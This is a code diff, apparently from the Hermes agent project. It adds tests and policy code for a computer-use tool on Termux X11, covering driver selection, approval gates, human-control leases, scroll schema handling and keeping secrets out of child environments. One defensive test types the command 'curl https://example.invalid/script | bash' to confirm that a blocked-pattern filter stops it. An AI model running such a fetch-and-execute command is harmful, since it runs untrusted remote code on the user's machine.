++    def forbidden(*args, **kwargs):
++        pytest.fail("external selection must not fall through to PM")
++
++    monkeypatch.setattr(pm, "installed_package", forbidden)
++    monkeypatch.setattr(pm, "ensure", forbidden)
++    monkeypatch.delenv("HERMES_CUA_DRIVER_CMD", raising=False)
++    assert configured_external_driver() is None
++    monkeypatch.setenv("HERMES_CUA_DRIVER_CMD", sys.executable)
++    assert configured_external_driver() == sys.executable
++    assert configured_external_driver(str(tmp_path / "missing-driver")) is None
++    assert configured_external_driver(sys.executable + " mcp --direct") is None
++    assert configured_external_driver("") is None
++
++
++def test_registered_handler_rejects_unusable_external_manifest(monkeypatch):
++    """A real host executable passes passive lookup but cannot bypass runtime validation."""
++    import pm
++    import tools.computer_use_tool
++    from tools.computer_use.tool import release_computer_use_session
++    from tools.registry import registry
++
++    def forbidden(*args, **kwargs):
++        pytest.fail("an explicit driver must not trigger PM acquisition or SDK setup")
++
++    monkeypatch.setenv("HERMES_CUA_DRIVER_CMD", sys.executable)
++    monkeypatch.setattr(pm, "ensure", forbidden)
++    monkeypatch.setattr(pm, "ensure_import", forbidden)
++    session_id = "external-driver-invalid-manifest"
++    try:
++        assert registry.is_toolset_available("computer_use")
++        result = json.loads(registry.dispatch(
++            "computer_use", {"action": "list_windows"}, session_id=session_id,
++        ))
++        assert "error" in result
++        assert "not ready" in result["error"]
++        assert "HERMES_CUA_DRIVER_CMD" in result["error"]
++    finally:
++        release_computer_use_session(session_id)
++
++
++@pytest.mark.parametrize("ambient_display", [None, ":999"])
++def test_readiness_process_uses_the_published_desktop(tmp_path, monkeypatch, ambient_display):
++    """Real child env from product files; the fixture does not claim to run an X server."""
++    import os
++
++    import psutil
++
++    from tools.bot_desktop import runtime
++    from tools.computer_use import permissions
++
++    home = tmp_path / "owned-profile"
++    monkeypatch.setenv("HERMES_HOME", str(home))
++    state = runtime.state_dir()
++    state.mkdir(parents=True)
++    owner = psutil.Process()
++    (state / "launcher.pid").write_text(
++        f"{owner.pid} {owner.create_time()}\n", encoding="utf-8",
++    )
++    published = {
++        "DISPLAY": ":73",
++        "XAUTHORITY": str(state / "Xauthority"),
++        "DBUS_SESSION_BUS_ADDRESS": "unix:path=owned-desktop-bus",
++    }
++    (state / "env").write_text(
++        "".join(f"{key}={value}\n" for key, value in published.items()), encoding="utf-8",
++    )
++    if ambient_display is None:
++        monkeypatch.delenv("DISPLAY", raising=False)
++    else:
++        monkeypatch.setenv("DISPLAY", ambient_display)
++    monkeypatch.setenv("XAUTHORITY", "stale-parent-authority")
++    monkeypatch.setenv("DBUS_SESSION_BUS_ADDRESS", "unix:path=stale-parent-bus")
++    monkeypatch.setenv("ANTHROPIC_API_KEY", "fixture-secret-must-not-be-forwarded")
++    keys = [*published, "CUA_DRIVER_RS_TELEMETRY_ENABLED"]
++    program = (
++        "import json,os;"
++        f"print(json.dumps({{k:os.environ.get(k) for k in {keys!r}}}));"
++        "assert 'ANTHROPIC_API_KEY' not in os.environ"
++    )
++    result = permissions._run(sys.executable, "-c", program, timeout=10)
++    assert result.returncode == 0, result.stderr
++    assert json.loads(result.stdout) == {**published, "CUA_DRIVER_RS_TELEMETRY_ENABLED": "0"}
++    assert os.environ.get("DISPLAY") == ambient_display
+diff --git a/tests/tools/test_cua_scroll_schema.py b/tests/tools/test_cua_scroll_schema.py
+new file mode 100644
+index 00000000..fa50860f
+--- /dev/null
++++ b/tests/tools/test_cua_scroll_schema.py
+@@ -0,0 +1,66 @@
++"""Scroll targeting follows the live driver schema without guessing its version.
++
++The native Termux integration exposed a driver whose scroll schema accepts x/y
++but has no input.scroll.coordinates token; dropping x/y moved input to center.
++"""
++from types import SimpleNamespace
++from unittest.mock import AsyncMock, Mock
++import asyncio
++
++import pytest
++
++from tools.computer_use.cua_backend import CuaDriverBackend
++
++
++def backend_with_scroll_schema(capabilities, properties):
++    backend = CuaDriverBackend()
++    backend._active_pid = 111
++    backend._active_window_id = 222
++    tool = SimpleNamespace(
++        name="scroll", capabilities=capabilities,
++        inputSchema={"type": "object", "properties": properties, "additionalProperties": False},
++    )
++    client = SimpleNamespace(list_tools=AsyncMock(return_value=SimpleNamespace(tools=[tool])))
++    asyncio.run(backend._session._populate_capabilities(client))
++    backend._session.call_tool = Mock(return_value={
++        "data": "ok", "images": [], "structuredContent": None, "isError": False,
++    })
++    return backend
++
++
++@pytest.mark.parametrize("capabilities,properties,include_coordinates", [
++    ([], {"x": {"type": "number"}, "y": {"type": "number"}}, True),
++    (["input.scroll.coordinates"], {}, True),
++    ([], {"x": {"type": "number"}}, False),
++    ([], {"y": {"type": "number"}}, False),
++    ([], {}, False),
++])
++def test_scroll_preserves_only_advertised_coordinate_support(capabilities, properties, include_coordinates):
++    backend = backend_with_scroll_schema(capabilities, properties)
++
++    result = backend.scroll(direction="down", amount=2, x=80, y=60)
++
++    assert result.ok
++    expected = {"pid": 111, "window_id": 222, "direction": "down", "amount": 2,
++                "session": backend._session_id}
++    if include_coordinates:
++        expected.update(x=80, y=60)
++    backend._session.call_tool.assert_called_once_with("scroll", expected)
++
++
++@pytest.mark.parametrize("window_id,element", [(222, 7), (None, None)])
++def test_scroll_retains_element_precedence_and_exact_window_requirement(window_id, element):
++    backend = backend_with_scroll_schema([], {"x": {"type": "number"}, "y": {"type": "number"}})
++    backend._active_window_id = window_id
++
++    result = backend.scroll(direction="down", amount=2, element=element, x=80, y=60)
++
++    if window_id is None:
++        assert not result.ok
++        backend._session.call_tool.assert_not_called()
++    else:
++        assert result.ok
++        backend._session.call_tool.assert_called_once_with("scroll", {
++            "pid": 111, "window_id": 222, "direction": "down", "amount": 2,
++            "element_index": 7, "session": backend._session_id,
++        })
+diff --git a/tests/tools/test_cua_termux_delivery.py b/tests/tools/test_cua_termux_delivery.py
+new file mode 100644
+index 00000000..b259ae74
+--- /dev/null
++++ b/tests/tools/test_cua_termux_delivery.py
+@@ -0,0 +1,245 @@
++"""Behavioral approval and placement policy for local Termux X11.
++
++Host facts are explicit data at the policy seam. These tests run real shared
++approval/lease gates on the host; native X11 delivery is proved by the probe.
++"""
++
++from __future__ import annotations
++
++import json
++from types import SimpleNamespace
++
++import pytest
++
++from tools.bot_desktop import placement
++from tools.computer_use.cua_backend_platform import termux_x11_context
++
++
++@pytest.mark.parametrize(
++    "termux,where,backend,ambient,published,expected",
++    [
++        (True, placement.GATEWAY, "cua", {"DISPLAY": ":73"}, {}, True),
++        (True, placement.GATEWAY, "cua", {}, {"DISPLAY": ":74"}, True),
++        (True, placement.GATEWAY, "cua",
++         {"DISPLAY": ":99", "WAYLAND_DISPLAY": "stale", "XDG_SESSION_TYPE": "wayland"},
++         {"DISPLAY": ":74"}, True),
++        (True, placement.GATEWAY, "cua", {}, {}, False),
++        (True, placement.GATEWAY, "cua",
++         {"DISPLAY": ":73", "WAYLAND_DISPLAY": "wayland-0"}, {}, False),
++        (True, placement.GATEWAY, "cua",
++         {"DISPLAY": ":73", "XDG_SESSION_TYPE": "wayland"}, {}, False),
++        (False, placement.GATEWAY, "cua", {"DISPLAY": ":73"}, {}, False),
++        (True, placement.TERMINAL, "cua", {"DISPLAY": ":73"}, {"DISPLAY": ":74"}, False),
++        (True, placement.REFUSED, "cua", {"DISPLAY": ":73"}, {}, False),
++        (True, placement.GATEWAY, "other-provider", {"DISPLAY": ":73"}, {}, False),
++    ],
++)
++def test_policy_uses_exact_host_placement_provider_and_x11(
++    termux, where, backend, ambient, published, expected,
++):
++    assert termux_x11_context(
++        termux=termux, where=where, backend=backend,
++        ambient=ambient, published=published,
++    ) is expected
++
++
++@pytest.fixture
++def policy_session(tmp_path, monkeypatch):
++    from tools import approval
++    from tools.approval_context import reset_current_session_key, set_current_session_key
++    from tools.computer_use import cua_backend_platform, tool
++
++    monkeypatch.setenv("HERMES_HOME", str(tmp_path / "profile"))
++    monkeypatch.setenv("HERMES_INTERACTIVE", "1")
++    key = "termux-policy-" + tmp_path.name
++    token = set_current_session_key(key)
++    tool.reset_backend_for_tests()
++    backend, created, prompts = tool._NoopBackend(), [], []
++
++    def factory(mode):
++        created.append(mode)
++        return backend
++
++    def once(command, description, **kwargs):
++        prompts.append((command, description))
++        return "once"
++
++    monkeypatch.setattr(tool, "_new_backend", factory)
++    monkeypatch.setattr(cua_backend_platform, "local_termux_x11", lambda: True)
++    tool.set_approval_callback(once)
++    yield SimpleNamespace(tool=tool, backend=backend, created=created,
++                          prompts=prompts, key=key, once=once)
++    tool.set_approval_callback(None)
++    tool.reset_backend_for_tests()
++    approval.clear_session(key)
++    reset_current_session_key(token)
++
++
++@pytest.mark.parametrize("mode", [None, "foreground"])
++@pytest.mark.parametrize("action_args", [
++    {"action": "click", "coordinate": [80, 60]},
++    {"action": "scroll", "coordinate": [80, 60], "direction": "down", "amount": 2},
++    {"action": "type", "text": "owned fixture input"},
++])
++def test_default_and_explicit_foreground_are_approved_before_dispatch(
++    policy_session, action_args, mode,
++):
++    state = policy_session
++    args = dict(action_args)
++    if mode is not None:
++        args["delivery_mode"] = mode
++    original = dict(args)
++    result = json.loads(state.tool.handle_computer_use(args, session_id=state.key))
++    assert "error" not in result
++    assert args == original
++    assert len(state.prompts) == 1
++    assert "FOREGROUND" in state.prompts[0][0]
++    assert state.created == ["standard"]
++    assert state.backend.calls[-1][1]["delivery_mode"] == "foreground"
++    assert state.backend.calls[-1][1]["bring_to_front"] is False
++
++
++def test_default_once_does_not_leave_a_reusable_grant(policy_session):
++    from tools import approval
++
++    state = policy_session
++    args = {"action": "click", "coordinate": [80, 60]}
++    for _ in range(2):
++        assert "error" not in json.loads(
++            state.tool.handle_computer_use(args, session_id=state.key),
++        )
++    assert len(state.prompts) == 2
++    assert not approval.is_approved(state.key, "cua:click:foreground")
++
++
++def test_background_session_grant_cannot_approve_default_foreground(policy_session):
++    from tools import approval
++
++    state = policy_session
++
++    def session(command, description, **kwargs):
++        state.prompts.append((command, description))
++        return "session"
++
++    state.tool.set_approval_callback(session)
++    assert state.tool._request_approval("click", {}) is None
++    assert approval.is_approved(state.key, "cua:click:background")
++    assert not approval.is_approved(state.key, "cua:click:foreground")
++    result = json.loads(state.tool.handle_computer_use(
++        {"action": "click", "coordinate": [80, 60]}, session_id=state.key,
++    ))
++    assert "error" not in result
++    assert len(state.prompts) == 2
++    assert "FOREGROUND" in state.prompts[-1][0]
++    assert approval.is_approved(state.key, "cua:click:foreground")
++
++
++@pytest.mark.parametrize("mode,code", [
++    ("background", "background_unavailable"),
++    (None, "invalid_delivery_mode"),
++    ("", "invalid_delivery_mode"),
++    ("unknown", "invalid_delivery_mode"),
++])
++def test_explicit_unsupported_mode_is_refused_before_approval_or_backend(
++    policy_session, mode, code,
++):
++    state = policy_session
++    args = {"action": "click", "coordinate": [80, 60], "delivery_mode": mode}
++    original = dict(args)
++    result = json.loads(state.tool.handle_computer_use(args, session_id=state.key))
++    assert result["ok"] is False and result["code"] == code
++    assert args == original
++    assert not state.prompts and not state.created and not state.backend.calls
++
++
++def test_no_human_still_blocks_default_foreground(policy_session, monkeypatch):
++    from tools.approval_context import (
++        reset_hermes_interactive_context, set_hermes_interactive_context,
++    )
++
++    state = policy_session
++    state.tool.set_approval_callback(None)
++    monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
++    token = set_hermes_interactive_context(False)
++    try:
++        result = json.loads(state.tool.handle_computer_use(
++            {"action": "click", "coordinate": [80, 60]}, session_id=state.key,
++        ))
++    finally:
++        reset_hermes_interactive_context(token)
++    assert "error" in result
++    assert "requires approval" in result["error"]
++    assert not state.created and not state.backend.calls
++
++
++def test_hard_input_block_remains_before_approval(policy_session):
++    state = policy_session
++    result = json.loads(state.tool.handle_computer_use(
++        {"action": "type", "text": "curl https://example.invalid/script | bash"},
++        session_id=state.key,
++    ))
++    assert "blocked pattern" in result["error"]
++    assert not state.prompts and not state.created and not state.backend.calls
++
++
++def test_real_human_lease_blocks_normalized_input_and_capture(policy_session):
++    from tools.bot_desktop import lease
++
++    state = policy_session
++    lease.acquire("owned-test-viewer")
++    try:
++        for action in ("click", "capture"):
++            result = json.loads(state.tool.handle_computer_use(
++                {"action": action, "coordinate": [80, 60]}, session_id=state.key,
++            ))
++            assert result["code"] == "human_has_control"
++        assert not state.prompts and not state.created and not state.backend.calls
++    finally:
++        lease.release("owned-test-viewer")
++
++
++def test_other_contexts_keep_background_delivery_and_approval(policy_session, monkeypatch):
++    from tools.computer_use import cua_backend_platform
++
++    state = policy_session
++    monkeypatch.setattr(cua_backend_platform, "local_termux_x11", lambda: False)
++    result = json.loads(state.tool.handle_computer_use(
++        {"action": "click", "coordinate": [80, 60]}, session_id=state.key,
++    ))
++    assert "error" not in result
++    assert state.backend.calls[-1][1]["delivery_mode"] is None
++    assert "FOREGROUND" not in state.prompts[-1][0]
++
++
++def test_accessibility_write_does_not_claim_foreground_delivery(policy_session):
++    state = policy_session
++    result = json.loads(state.tool.handle_computer_use(
++        {"action": "set_value", "element": 1, "value": "fixture"}, session_id=state.key,
++    ))
++    assert "error" not in result
++    assert "FOREGROUND" not in state.prompts[-1][0]
++    assert "delivery_mode" not in state.backend.calls[-1][1]
++
++
++def test_remote_provider_never_reads_a_local_driver(monkeypatch):
++    from plugins.computer_use.cua import CuaDriverProvider
++    from tools.computer_use import cua_backend_driver
++
++    monkeypatch.setattr(placement, "resolve", lambda: SimpleNamespace(where=placement.TERMINAL))
++
++    def forbidden(*args, **kwargs):
++        pytest.fail("remote placement must not inspect or acquire a local binary")
++
++    monkeypatch.setattr(cua_backend_driver, "resolve_cua_driver_cmd", forbidden)
++    assert CuaDriverProvider().is_available()
++
++
++@pytest.mark.parametrize("configured,expected", [(None, True), (False, False), (True, True)])
++def test_termux_no_overlay_default_preserves_explicit_config(monkeypatch, configured, expected):
++    from tools.computer_use import cua_backend, cua_backend_platform
++
++    monkeypatch.setattr(cua_backend_platform, "local_termux_x11", lambda: True)
++    monkeypatch.setattr(cua_backend, "_computer_use_cfg", lambda: (
++        {} if configured is None else {"no_overlay": configured}
++    ))
++    assert cua_backend._cua_no_overlay() is expected
+diff --git a/tools/computer_use/cua_backend.py b/tools/computer_use/cua_backend.py
+index ec903cbf..6e56ee93 100644
+--- a/tools/computer_use/cua_backend.py
++++ b/tools/computer_use/cua_backend.py
+@@ -48,11 +48,17 @@ def _cua_no_overlay() -> bool:
+     fullscreen always-on-top all-workspaces window with no compositor-owned lifecycle, so an unclean session
+     end can leave it wedged over every app); on for Windows and Linux Wayland (compositor owns the surface).
+ 
++    Local Termux X11 also defaults off; only its no-overlay path is validated.
+     Explicit ``True`` / ``False`` overrides auto-detection. See #28152, #47032.
+     """
+     val = _computer_use_cfg().get("no_overlay")
+-    if val is not None or sys.platform != "linux":
+-        return bool(val) if val is not None else sys.platform == "darwin"
++    if val is not None:
++        return bool(val)
++    from tools.computer_use.cua_backend_platform import local_termux_x11
++    if local_termux_x11():
++        return True  # Only the no-overlay Termux X11 path is validated.
++    if sys.platform != "linux":
++        return sys.platform == "darwin"
+     wsl = is_wsl()
+     return wsl or not os.environ.get("DISPLAY") or (
+         # Linux/X11: the cursor overlay is a fullscreen, always-on-top, all-workspaces X11 window
+@@ -285,6 +291,9 @@ class CuaDriverBackend(_CaptureMixin, _InputMixin, ComputerUseBackend):
+         if sandbox_mcp_invocation() is not None:
+             contract = {"ready": True}
+         else:
++            from tools.computer_use.cua_backend_platform import local_cua_host_supported, local_cua_unsupported_reason
++            if not local_cua_host_supported():
++                raise RuntimeError(local_cua_unsupported_reason())
+             if not os.environ.get(_CUA_DRIVER_CMD_ENV, "").strip():
+                 from pm import ensure
+                 ensure("cua-driver")
+@@ -347,7 +356,8 @@ class CuaDriverBackend(_CaptureMixin, _InputMixin, ComputerUseBackend):
+             logger.debug("cua-driver %s: %s", what, e)
+ 
+     def is_available(self) -> bool:
+-        return sys.platform in ("darwin", "win32", "linux") and cua_driver_binary_available()  # other Unix-likes untested E2E
++        from tools.computer_use.cua_backend_platform import local_cua_host_supported
++        return local_cua_host_supported() and cua_driver_binary_available()
+ 
+     def _clear_active_target(self) -> None:
+         """Forget a capture/focus target so a failed lookup cannot misroute input."""
+diff --git a/tools/computer_use/cua_backend_driver.py b/tools/computer_use/cua_backend_driver.py
+index 017a6702..0ec981db 100644
+--- a/tools/computer_use/cua_backend_driver.py
++++ b/tools/computer_use/cua_backend_driver.py
+@@ -89,6 +89,10 @@ def cua_driver_binary_available() -> bool:
+     return resolve_cua_driver_cmd() is not None
+ 
+ def cua_driver_install_hint() -> str:
++    from hermes_platform.host.runtime import is_termux
++    from tools.computer_use.cua_backend_platform import TERMUX_X11_HINT
++    if is_termux() or sys.platform == "android":
++        return TERMUX_X11_HINT
+     return ("cua-driver is not installed. Install the pinned driver with:\n  hermes computer-use install\n"
+             "Or run `hermes tools` and enable the Computer Use toolset to install it automatically.")
+ 
+diff --git a/tools/computer_use/cua_backend_input.py b/tools/computer_use/cua_backend_input.py
+index 2b09856a..04ba7c2e 100644
+--- a/tools/computer_use/cua_backend_input.py
++++ b/tools/computer_use/cua_backend_input.py
+@@ -137,7 +137,9 @@ class _InputMixin:
+         # coordinates when the driver advertises support; otherwise it scrolls the targeted window
+         # (window_id is still sent for routing).
+         xy = lambda: ({"x": x, "y": y}
+-                      if self._session.supports_capability("input.scroll.coordinates", tool="scroll") else {})
++                      if (self._session.supports_capability("input.scroll.coordinates", tool="scroll")
++                          or (self._session.supports_input_property("scroll", "x")
++                              and self._session.supports_input_property("scroll", "y"))) else {})
+         refusal = self._pointer_args("scroll", args, (
+             ("element scroll", {"element_index": element}
+              if element is not None and self._active_window_id is not None else None),
+diff --git a/tools/computer_use/cua_backend_platform.py b/tools/computer_use/cua_backend_platform.py
+new file mode 100644
+index 00000000..9b851de5
+--- /dev/null
++++ b/tools/computer_use/cua_backend_platform.py
+@@ -0,0 +1,84 @@
++"""Local CUA admission and input policy for the reviewed Termux X11 driver.
++
++A sealed PM source build or an explicit executable selects the existing X11
++transport. Startup still validates its full runtime manifest and desktop.
++"""
++
++from __future__ import annotations
++
++import os
++import sys
++from collections.abc import Mapping
++from typing import Optional
++
++from hermes_platform.host.runtime import is_termux
++
++TERMUX_X11_HINT = (
++    "Termux X11 requires the native cua-driver sealed into this Hermes package, "
++    "or an externally built driver selected by HERMES_CUA_DRIVER_CMD. "
++    "No Android driver download is published by Hermes PM. This driver controls "
++    "X11 desktop windows; Android phone UI is unavailable."
++)
++
++
++def local_cua_supported(platform: str, *, termux: bool, driver_selected: bool) -> bool:
++    """Platform facts are data; Termux requires a reviewed PM or explicit executable."""
++    if termux:
++        return platform in ("android", "linux") and driver_selected
++    return platform in ("darwin", "win32", "linux")
++
++
++def configured_external_driver(override: Optional[str] = None) -> Optional[str]:
++    """Resolve an explicit executable without consulting or acquiring a PM package."""
++    from tools.computer_use.cua_backend_driver import _CUA_DRIVER_CMD_ENV, resolve_cua_driver_cmd
++
++    configured = (override if override is not None else os.environ.get(_CUA_DRIVER_CMD_ENV, "")).strip()
++    return resolve_cua_driver_cmd(configured) if configured else None
++
++
++def local_cua_host_supported(*, override: Optional[str] = None) -> bool:
++    """Admit the selected host driver; manifest/display checks remain at startup."""
++    from tools.computer_use.cua_backend_driver import resolve_cua_driver_cmd
++
++    termux = is_termux()
++    return local_cua_supported(
++        sys.platform, termux=termux,
++        driver_selected=bool(resolve_cua_driver_cmd(override)) if termux else False,
++    )
++
++
++def termux_x11_context(*, termux: bool, where: str, backend: str,
++                      ambient: Mapping[str, str], published: Mapping[str, str]) -> bool:
++    """Input policy from explicit host/placement facts, without acquiring any driver."""
++    from tools.bot_desktop import placement
++
++    if not termux or where != placement.GATEWAY or backend != "cua":
++        return False
++    # A live profile desktop is X11 and overrides stale inherited Wayland variables,
++    # just as runtime.desktop_env does when it spawns the real driver.
++    if published.get("DISPLAY"):
++        return True
++    return bool(ambient.get("DISPLAY") and not ambient.get("WAYLAND_DISPLAY")
++                and ambient.get("XDG_SESSION_TYPE") != "wayland")
++
++
++def local_termux_x11() -> bool:
++    """Whether this call uses the local Termux X11 CUA input/overlay policy."""
++    if not is_termux():
++        return False
++    from plugins.computer_use import configured_backend_name
++    from tools.bot_desktop import placement, runtime
++
++    where = placement.resolve().where
++    if where != placement.GATEWAY:
++        return False  # Never inspect or normalize a remotely placed driver's input.
++    return termux_x11_context(
++        termux=True, where=where, backend=configured_backend_name(),
++        ambient=os.environ, published=runtime.published_env(),
++    )
++
++
++def local_cua_unsupported_reason() -> str:
++    if is_termux() or sys.platform == "android":
++        return TERMUX_X11_HINT
++    return f"Local cua-driver is not supported on this host platform ({sys.platform})."
+diff --git a/tools/computer_use/permissions.py b/tools/computer_use/permissions.py
+index 2cdc00dd..e8104c20 100644
+--- a/tools/computer_use/permissions.py
++++ b/tools/computer_use/permissions.py
+@@ -16,7 +16,6 @@ from typing import Any, Dict, Optional
+ 
+ from hermes_cli._subprocess_compat import windows_hide_flags
+ 
+-_RUNTIME_PLATFORMS = frozenset({"darwin", "win32", "linux"})  # mirrors the toolset platform_gate
+ _BOOLS = ("accessibility", "screen_recording", "screen_recording_capturable")
+ CUA_DRIVER_BUNDLE_ID = "com.trycua.driver"  # the only identity TCC rows and the private daemon are keyed to
+ _TCC_SERVICES = {"accessibility": "Accessibility", "screen_recording": "ScreenCapture"}  # status field -> tccutil service
+@@ -88,9 +87,13 @@ def computer_use_status(driver_cmd: Optional[str] = None) -> dict[str, Any]:
+     probe failed). ``can_grant`` is macOS-only."""
+     from plugins.computer_use import DEFAULT_BACKEND, configured_backend_name, get_active_provider
+     from tools.computer_use.cua_backend_driver import resolve_cua_driver_cmd  # same resolver as the tool itself
++    from hermes_platform.host.runtime import is_termux
++    from tools.computer_use.cua_backend_platform import (
++        TERMUX_X11_HINT, local_cua_host_supported, local_cua_unsupported_reason,
++    )
+     plat, name = sys.platform, configured_backend_name()
+     binary = resolve_cua_driver_cmd(driver_cmd) if name == DEFAULT_BACKEND else None
+-    out: dict[str, Any] = {"platform": plat, "platform_supported": plat in _RUNTIME_PLATFORMS,
++    out: dict[str, Any] = {"platform": plat, "platform_supported": local_cua_host_supported(override=driver_cmd),
+                            "installed": bool(binary), "version": None, "ready": None, "can_grant": plat == "darwin",
+                            "checks": [], "source": None, "error": None, **{k: None for k in _BOOLS}}
+     if name != DEFAULT_BACKEND:  # another driver is selected: cua-driver probes and TCC grants do not apply
+@@ -103,13 +106,26 @@ def computer_use_status(driver_cmd: Optional[str] = None) -> dict[str, Any]:
+         out.update(installed=True, version=f"{provider.display_name} (computer_use.backend: {provider.name})",
+                    ready=provider.is_available())
+         return out
++    if not out["platform_supported"]:
++        out.update(ready=False, error=local_cua_unsupported_reason())
++        return out
+     if not binary:
+         return out
++    termux_x11 = is_termux()
++    if termux_x11:
++        from tools.computer_use.cua_backend_driver import cua_driver_runtime_contract_status
++        contract = cua_driver_runtime_contract_status(binary)
++        out["source"] = {"kind": "selected", "binary": binary, "scope": "termux-x11"}
++        if not contract["ready"]:
++            out.update(ready=False, version=contract["version"], error=contract["reason"])
++            return out
+     with suppress(Exception):
+         out["version"] = (_run(binary, "--version", timeout=5).stdout or "").strip() or None
+     doctor = _doctor(binary)
+     if doctor is not None:
+         out["checks"] = doctor["checks"]
++    if termux_x11:
++        out["checks"].append({"label": "Termux X11 driver", "status": "warn", "message": TERMUX_X11_HINT})
+     if plat == "darwin":
+         _mac_permissions(binary, out)
+         if out["error"] is None:
+diff --git a/tools/computer_use/schema.py b/tools/computer_use/schema.py
+index 90d55c82..81862686 100644
+--- a/tools/computer_use/schema.py
++++ b/tools/computer_use/schema.py
+@@ -160,11 +160,12 @@ _PROPERTIES: dict[str, Any] = {
+         "type": "string",
+         "enum": ["background", "foreground"],
+         "description": (
+-            "For input actions (click, type, key, drag, scroll). `background` (DEFAULT) delivers "
+-            "without raising the window or stealing focus. `foreground` briefly fronts the window "
+-            "then restores focus — a visible change needing its own approval; use it only when a "
+-            "result's verdict tells you to escalate there. Each result's `verdict` carries the "
+-            "next step; follow it rather than guessing."
++            "For input actions (click, type, key, drag, scroll). `background` normally defaults "
++            "to delivery without raising the window or stealing focus. Local Termux X11 uses "
++            "`foreground` by default and refuses explicit background input. `foreground` briefly "
++            "fronts the window then restores focus — a visible change named in its own approval. "
++            "On other hosts, use foreground only when a result's verdict tells you to escalate "
++            "there; follow the verdict rather than guessing."
+         ),
+     },
+     "bring_to_front": {
+diff --git a/tools/computer_use/tool.py b/tools/computer_use/tool.py
+index 882e238c..07546981 100644
+--- a/tools/computer_use/tool.py
++++ b/tools/computer_use/tool.py
+@@ -331,8 +331,23 @@ def handle_computer_use(args: dict[str, Any], **kwargs) -> Any:
+     except _bd_lease.HumanHasControl as e:
+         return _refused(e)
+     _bd_ensure_started()  # headless gateway: bring the profile's screen up before the backend probes DISPLAY
++    from tools.computer_use.cua_backend_platform import local_termux_x11
++    # set_value is an accessibility write with no delivery-mode parameter. The other
++    # native inputs must expose their tested X11 focus behavior BEFORE approval.
++    termux_input = action in _INPUT_ACTIONS and action != "set_value" and local_termux_x11()
++    if termux_input and "delivery_mode" not in args:
++        args = {**args, "delivery_mode": "foreground"}  # Never mutate the caller's request.
+     if (err := _reject_unsafe(action, args)) is not None:
+         return err
++    if termux_input and args.get("delivery_mode") != "foreground":
++        background = args.get("delivery_mode") == "background"
++        return json.dumps({
++            "ok": False, "action": action,
++            "code": "background_unavailable" if background else "invalid_delivery_mode",
++            "error": ("Background input is unavailable on local Termux X11. "
++                      "Request foreground input explicitly; its visible focus change requires approval."
++                      if background else "Local Termux X11 input requires delivery_mode='foreground'."),
++        })
+     scopes = ([action] if action in _ACTIONS and _ACTIONS[action].destructive else []) + (
+         ["bring_to_front"] if args.get("bring_to_front") or (action == "focus_app" and args.get("raise_window")) else [])
+     for scope in scopes:
